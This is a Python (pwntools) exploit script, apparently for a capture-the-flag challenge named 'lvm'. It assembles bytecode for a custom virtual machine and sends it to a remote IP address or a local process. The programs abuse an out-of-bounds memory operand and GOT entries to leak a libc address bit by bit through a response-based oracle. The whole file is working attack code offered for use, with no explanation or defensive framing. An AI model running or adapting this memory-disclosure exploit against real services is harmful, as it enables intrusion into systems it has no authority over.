from pwn import *
import sys

ins = ['nop', 'add', 'sub', 'shl', 'shr', 'and', 'or', 'xor', 'not', 'mov', 'jmp']


def parseLvalue(lval):
    global f

    ltype = lval[0]
    if ltype == 'r':
        f.write('\x00')
        reg_num = int(lval[1:], 10)
        f.write(bytearray([reg_num]))
    elif ltype == 'm':
        f.write('\x02')
        m_addr = int(lval[1:], 10)

        if m_addr < 0:
            m_addr = (m_addr + (1 << 32)) % (1 << 32)
        f.write(p32(m_addr))
    else:
        print 'Invalid Lvalue'
        exit()


def parseArg(arg):
    global f

    atype = arg[0]
    if atype == 'r':
        f.write('\x00')
        reg_num = int(arg[1:], 10)
        f.write(bytearray([reg_num]))
    elif atype == 'i':
        f.write('\x01')
        i_val = int(arg[1:], 10)
        f.write(p64(i_val))
    else:
        print 'Invalid Arg'
        exit()


def parseRvalue(rval):
    global f
    rtype = rval[0]
    if rtype == 'r':
        f.write('\x00')
        reg_num = int(rval[1:], 10)
        f.write(bytearray([reg_num]))
    elif rtype == 'i':
        f.write('\x01')
        i_val = int(rval[1:], 10)
        f.write(p64(i_val))
    elif rtype == 'm':
        f.write('\x02')
        m_addr = int(rval[1:], 10)
        if m_addr < 0:
            m_addr = (m_addr + (1 << 32)) % (1 << 32)
            print m_addr
        f.write(p32(m_addr))
    else:
        print 'Invalid Rvalue'
        exit()


def ass(asm):
    for opcodes in asm:
        opcode = opcodes.split(' ')
        ins_type = opcode[0]

        # invalid
        if ins_type == ins[1]:
            f.write('\x01')
            parseLvalue(opcode[1])
            parseRvalue(opcode[2])
        # sub
        elif ins_type == ins[2]:
            f.write('\x02')
            parseLvalue(opcode[1])
            parseRvalue(opcode[2])
        # shl
        elif ins_type == ins[3]:
            f.write('\x03')
            parseLvalue(opcode[1])
            parseRvalue(opcode[2])
        # shr
        elif ins_type == ins[4]:
            f.write('\x04')
            parseLvalue(opcode[1])
            parseRvalue(opcode[2])
        # and
        elif ins_type == ins[5]:
            f.write('\x05')
            parseLvalue(opcode[1])
            parseRvalue(opcode[2])
        # or
        elif ins_type == ins[6]:
            f.write('\x06')
            parseLvalue(opcode[1])
            parseRvalue(opcode[2])
        # xor
        elif ins_type == ins[7]:
            f.write('\x07')
            parseLvalue(opcode[1])
            parseRvalue(opcode[2])
        # not
        elif ins_type == ins[8]:
            f.write('\x08')
            parseArg(opcode[1])
        # mov
        elif ins_type == ins[9]:
            f.write('\x09')
            parseLvalue(opcode[1])
            parseRvalue(opcode[2])
        # jp
        elif ins_type == ins[10]:
            f.write('\x0a')
            parseArg(opcode[1])
        else:
            print 'Invalid instruction'
            exit()

exit_got = 0x601FF8
alarm_got = 0x601FC8
puts_got = 0x601FC0

bit = ''
for i in range(12):
    if len(sys.argv) > 1:
        p = remote('211.239.124.246', '23904')
    else:
        p = process('./lvm')

    f = open('bin', 'wb')

    a = []

    a.append('mov r0 i' + str(puts_got))
    a.append('mov r0 m5000')
    a.append('shr r0 i' + str(i))
    a.append('and r0 i1')
    a.append('shl r0 i13')
    a.append('mov m-4144 r0')

    ass(a)

    with open('bin', 'r') as f:
        payload = f.read()
    p.send(payload)
    p.recvline()
    if "VM" in p.recvline():
        bit = '1' + bit
    else:
        bit = '0' + bit
    p.close()

print '%03x' % int(bit, 2)
